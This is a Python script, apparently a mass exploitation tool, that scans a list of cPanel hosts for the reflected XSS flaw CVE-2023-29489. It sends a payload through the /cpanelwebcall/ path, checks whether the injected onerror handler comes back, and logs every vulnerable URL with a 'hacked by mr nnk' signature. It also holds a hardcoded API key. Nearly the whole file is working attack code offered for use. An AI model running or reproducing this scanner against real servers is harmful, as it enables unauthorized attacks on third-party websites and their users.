import shodan
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import pystyle
from pystyle import *
import webbrowser
import socket

TM = 'P0l3Hagw156AFK9Mk8e3hA6xEsiLFqXf'
def main():

    if platform.system() == 'Windows':
        os.system(f'title Exploit XSS CVE-2023-29489')

    not_exploit = 0
    exploit = 0
    error_connect = 0

    def search_cpanel_hosts(api_key):
        hosts = Write.Input("\r\n\nEnter the url list file : ", Colors.green)
        print("\r")
        file_site = open(hosts,'r').read().splitlines()
        for host in file_site:
            host = host.replace("https://","").replace("http://","").replace("/","")
            if host:
                yield host

    def test_xss(url):
        payload = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1111)">hacked%20by%20mr%20nnk"""
        xss_url = urljoin(url, payload)
        response = requests.get(xss_url, verify=False)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        img_tags = soup.find_all('img', src='x')
        
        for img_tag in img_tags:
            if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1111)":
                return True, xss_url
        return False, None


    redirect_url = Write.Input("\r\n\nEnter the redirection link :  ", Colors.green)
    for host in search_cpanel_hosts(TM):
        for protocol in ['http', 'https']:
            url = f'{protocol}://{host}'
            ip = socket.gethostbyname(host)
            
            try:
                is_exploit, xss_url = test_xss(url)
                if is_exploit:
                    print(f'\033[35m[+]\033[32m Exploit XSS >>>\033[37m {url} ~ {ip}')
                    exploit +=  1
                    if platform.system() == 'Windows':
                        os.system(
                            f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By nnk'
                        ) 
                    
                    webbrowser.open(redirect_url)
                    
                    payload  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1111)">hacked%20by%20mr%20nnk"""
                    xss_file = open("xss_file.txt", "a")
                    xss_file.write(f"{url}{payload}\n")
                    xss_file.close()
                else: 
                    print(f'\033[35m[+]\033[31m Not Exploit >>>\033[37m {url} ~ {ip}')
                    not_exploit += 1
                    if platform.system() == 'Windows':
                        os.system(
                            f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By nnk'
                        ) 
            except Exception as e:
                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!')
                error_connect += 1
                if platform.system() == 'Windows':
                    os.system(
                        f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By nnk'
                    )

if __name__ == '__main__':
    main()

print("\n\n\t\t By NNK\t\n")